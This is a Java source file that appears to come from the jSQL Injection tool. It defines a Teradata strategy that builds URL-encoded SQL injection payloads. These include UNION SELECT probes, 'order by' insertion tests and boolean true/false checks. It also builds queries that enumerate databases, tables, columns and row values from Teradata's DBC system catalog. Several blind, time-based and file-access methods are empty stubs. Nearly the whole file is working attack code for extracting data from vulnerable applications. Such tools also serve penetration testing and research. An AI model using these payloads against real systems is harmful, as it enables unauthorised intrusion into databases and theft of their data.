package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class TeradataStrategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "select'-'||'{%}'||" +
            "database||'{%}'||" +
            "user||'{%}'||" +
            "CURRENT_USER||" +
            "'%01%03%03%07'" +
            "";
    }

    @Override
    public String getSchemaList() {
        return 
            "select+'%04'||DatabaseName||'%050%04%01%03%03%07'FROM" +
            "(select+DatabaseName,ROW_NUMBER()over(ORDER+BY+DatabaseName)AS+rnum+from+DBC.DBASE)x+where+1=1+{limit}";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select+'%04'||TVMName||'%050%04%01%03%03%07'FROM" +
            "(select+TVMName,ROW_NUMBER()over(ORDER+BY+TVMName)AS+rnum+from+DBC.TVM+t+inner+join+DBC.DBASE+d+on+t.DatabaseId=d.DatabaseId+where+DatabaseName='" + database + "')x+where+1=1+{limit}";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select+'%04'||FieldName||'%050%04%01%03%03%07'FROM" +
            "(select+FieldName,ROW_NUMBER()over(ORDER+BY+FieldName)AS+rnum+from(select+distinct+FieldName+"
            + "from+DBC.TVFIELDS+c+inner+join+DBC.TVM+t+on+c.TableId=t.TVMId+"
            + "+inner+join+DBC.DBASE+d+on+t.DatabaseId=d.DatabaseId+"
            + "where+DatabaseName='" + table.getParent() + "'"
            + "and+TVMName='" + table + "')x)x+where+1=1+"
            + "{limit}"
            ;
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, ",''))||'%7f'||trim(coalesce(''||");
        formatListColumn = "trim(coalesce(''||" + formatListColumn + ",''))";
        
        return
            "SELECT'%04'||r||'%050%04%01%03%03%07'from(select+" + formatListColumn + "+r,ROW_NUMBER()over(ORDER+BY+1)AS+rnum+from+" + database + "." + table + ")x+where+1=1+{limit}";
    }

    @Override
    public String getPrivilege() {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String readTextFile(String filePath) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String writeTextFile(String content, String filePath) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String blindCheck(String check) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String timeCheck(String check) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String getErrorBasedStrategyCheck() {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        // TODO Auto-generated method stub
        return "";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
            "select+" +
                /**
                 * If reach end of string (SQLii) then NULLIF nullifies the result
                 */
                 "'SQLi'||NULLIF(substr(" +
                 "(" + sqlQuery + ")," +
                 startPosition + "" +
             "),'%01%03%03%07')";
     }
    
     @Override
     public String timeStrategy(String sqlQuery, String startPosition) {
         // TODO Auto-generated method stub
         return "";
     }

     @Override
     public String performanceQuery(String[] indexes) {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
                 "(select+'SQLi$1'||cast(rpad('%23',1024,'%23')as+varchar(1024)))"
             );
     }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("trim(''||(1337"+ i +"7330%2b1))");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "FROM(SELECT+1+AS+x)x--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "and+rnum+BETWEEN+" + (limitSQLResult+1) + "+AND+" + (limitSQLResult+1) + "";
    }
    
    @Override
    public String getDbLabel() {
        return "Teradata";
    }
}